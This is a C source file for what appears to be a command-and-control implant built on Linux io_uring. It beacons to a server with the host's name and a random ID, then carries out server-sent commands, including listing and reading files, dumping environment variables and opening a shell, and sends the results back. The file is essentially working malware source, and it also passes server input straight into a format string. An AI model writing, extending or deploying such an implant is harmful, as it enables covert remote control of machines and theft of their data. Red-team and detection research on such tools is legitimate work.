#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <liburing.h>
#include <errno.h>
#include <time.h>
#include "agent_functions/command_header.h"
#include "agent_functions/function_header.h"

// Constants
#define QUEUE_DEPTH 16    // Max number of rings. Like threads kinda.
#define BUFFER_SIZE 16384 // Buffer for receiving data

unsigned int sleep_int = 10;

void sanitize_cmd(char *cmd) {
    size_t len = strlen(cmd);
    while (len > 0 && (cmd[len-1] == '\n' || cmd[len-1] == '\r' || cmd[len-1] == ' ' || cmd[len-1] == '\t'))
        cmd[--len] = '\0';
}

//Hash map to find functions and execute them
#define TABLE_SIZE 20
#define CMD_LEN 64

typedef void (*func_ptr)(struct io_uring *ring, int sockfd, const char *uuid, const char *args);

typedef struct {
    char command[CMD_LEN];
    func_ptr func;
} check;

check * hash_table[TABLE_SIZE];

unsigned int hash(char *name) {
    unsigned long hash = 5381;
    int c;

    while ((c = *name++)) {
        // hash * 33 + c
        hash = ((hash << 5) + hash) + c;
    }
    return hash % TABLE_SIZE;
}

check function[] = {
    {"ls", cmd_ls},
    {"cat", cmd_cat},
    {"env", cmd_env},
    {"shell", cmd_shell},
    {"NULL", NULL}
};

bool hash_insert() {
    for (int i = 0; function[i].func != NULL; i++) {
        int index = hash(function[i].command);
        if (hash_table[index] != NULL) {
            printf("ERROR: Hash Table Insert Collision!!");
            return false;
        }
        else {
            hash_table[index] = &function[i];
        }
    }
    return true;
}

void command_execute(struct io_uring *ring, int sockfd, const char *uuid, char *input) {
    sanitize_cmd(input);
    char **tmp = split(input, ' ', 1);
    char *args = tmp[1];
    char *command = tmp[0];
    if (strcmp(command, "sleep") == 0) {
        sleep_int = atoi(args);
        send2serv(uuid, "Done", 6);
    } else {
        char lookup_key[CMD_LEN];
        snprintf(lookup_key, sizeof(lookup_key), command);
        int index = hash(lookup_key);
        if (hash_table[index] != NULL && strcmp(hash_table[index]->command, lookup_key) == 0) {
            hash_table[index]->func(ring, sockfd, uuid, args);
        } else {
            char msg[256];
            snprintf(msg, sizeof(msg), "Invalid command or Something went wrong! (%s %s) How did you do this??\n", command, args ? args : "NULL");
            send2serv(uuid, msg, strlen(msg));
        }
    }
    free(tmp);
}

// A struct to hold all the data associated with a request.

int main() {

    //Create UUID
    srand(time(NULL));
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
    int charset_len = strlen(charset);

    int uuid_len = 16 + 1;
    char tmp_uuid[uuid_len + 1];
    for (int i = 0; i < uuid_len; i++) {
        int uuid_index = rand() % charset_len;
        tmp_uuid[i] = charset[uuid_index];
    }
    tmp_uuid[uuid_len] = '\0';
    char *uuid = base64_encode((const unsigned char *)tmp_uuid, strlen(tmp_uuid));

    struct io_uring ring;
    // struct io_uring_sqe *sqe;
    // struct io_uring_cqe *cqe;
    hash_insert();
    // --- 2. Initialize io_uring ---
    // This sets up the shared memory rings between our app and the kernel.
    if (io_uring_queue_init(QUEUE_DEPTH, &ring, 0) < 0) {
        perror("io_uring_queue_init");
        return 1;
    }

    char *hostname = read_file(&ring, "/proc/sys/kernel/hostname");
    sanitize_cmd(hostname);

    while (true) {
        request_t *req = calloc(1, sizeof(request_t));
        int sockfd = connection(&ring, req);

        if (sockfd < 0) {
            sleep(sleep_int);
            continue;
        }

        char *http_body = send_get(&ring, req, uuid, "login", hostname);

        if (strcmp(http_body, "exit") == 0) {
            close(req->client_socket);
            //io_uring_queue_exit(&ring);
            free(req);
            free(uuid);
            free(hostname);
            break;
        } else if (strcmp(http_body, "") == 0) {
            close(req->client_socket);
            free(req);
            sleep(sleep_int);
            continue;
        } else {
            command_execute(&ring, req->client_socket, uuid, http_body);
        }

        close(req->client_socket);
        free(req);
        sleep(sleep_int);
    }

    io_uring_queue_exit(&ring);
    return 0;
}
